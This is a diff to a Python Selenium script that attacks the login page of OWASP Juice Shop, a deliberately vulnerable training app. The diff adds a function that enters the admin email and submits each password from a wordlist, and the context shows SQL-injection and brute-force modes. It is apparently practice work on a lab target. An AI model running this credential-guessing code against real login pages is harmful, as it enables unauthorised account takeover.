@@ -53,13 +53,46 @@ def main():
     elif(method == "hardbrute"):
         bruteForcePassword(driver, attempts, True)
     elif(method == "dict"):
-        print("dictionary attack is not available in your geographic region")
+        databasePassword(driver)
     else:
         print("Usage: adminLogin.py -method=[sql, brute]")
     # Close the browser
     input("Press Enter to close the browser...")
     driver.quit()
     exit()
+
+def databasePassword(driver):
+    try:
+
+        acctBtn = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.ID, "navbarAccount"))
+        )
+        acctBtn.click()
+
+        logInBtn = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
+        )
+        logInBtn.click()
+    except Exception as e:
+        print(f"Could not click log in buttons: {e}")
+
+    emailField = WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.ID, "email"))
+    )
+    emailField.send_keys("admin@juice-sh.op")
+    # Open file and test each password
+    with open("passwords.txt") as f:
+        for password in f:
+            try:
+                passwordField = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.ID, "password"))
+            )
+                passwordField.clear()
+                passwordField.send_keys(password)
+                print(f"Trying password: {password}")
+                passwordField.send_keys(Keys.RETURN)
+            except Exception as e:
+                print(f"Could not enter text: {e}")
 
 def bruteForcePassword(driver, attempts, hardness):
         # Attempt to log in
